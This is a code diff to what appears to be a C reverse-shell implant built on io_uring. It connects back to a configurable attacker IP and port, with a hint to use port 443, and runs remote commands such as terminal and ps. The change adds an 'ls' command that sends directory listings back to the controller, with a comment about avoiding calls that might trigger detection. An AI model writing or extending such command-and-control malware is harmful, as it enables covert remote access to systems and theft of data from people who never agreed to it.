@@ -8,6 +8,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
+#include <sys/syscall.h>
 #include <utmp.h>
 #include <dirent.h>
 #include <signal.h>
@@ -22,7 +23,7 @@
 
 #define SERVER_IP "127.0.0.1" //CHANGE THIS BRO
 #define SERVER_PORT 4444 // RECOMMENDEED PORT 443
-#define QUEUE_DEPTH 16
+#define QUEUE_DEPTH 256
 #define BUF_SIZE 65536
 #define RECONNECT_TIME 5
 
@@ -808,6 +809,32 @@ done:
     exit(0);
 }
 
+/*
+cmd_ls that will use some standard calls like cmd_ps which might trigger stuff
+*/
+
+void cmd_ls(struct io_uring *ring, int sockfd, const char *path) {
+    char out[16384];
+    size_t pos = 0;
+
+    DIR *dir = opendir(path);
+    if (!dir) {
+        send_all(ring, sockfd, "Failed to open dir\n", 21);
+        return;
+    }
+
+    struct dirent *entry;
+
+    while ((entry = readdir(dir)) != NULL) {
+        /* printf("%s\n", entry->d_name); */
+        pos += snprintf(out + pos, sizeof(out) - pos, "%s\n", entry->d_name);
+    }
+
+    closedir(dir);
+    send_all(ring, sockfd, out, pos);
+}
+
+
 void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     sanitize_cmd(cmd);
 
@@ -846,7 +873,10 @@ void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     } else if (!(strncmp(cmd, "terminal", 8))) {
         cmd_terminal(ring, sockfd);
 
-    }else if (strncmp(cmd, "exit", 4) == 0) {
+    } else if (strncmp(cmd, "ls ", 3) == 0) {
+        cmd_ls(ring, sockfd, cmd + 3);
+
+    } else if (strncmp(cmd, "exit", 4) == 0) {
         cmd_exit(ring, sockfd);
 
     } else {
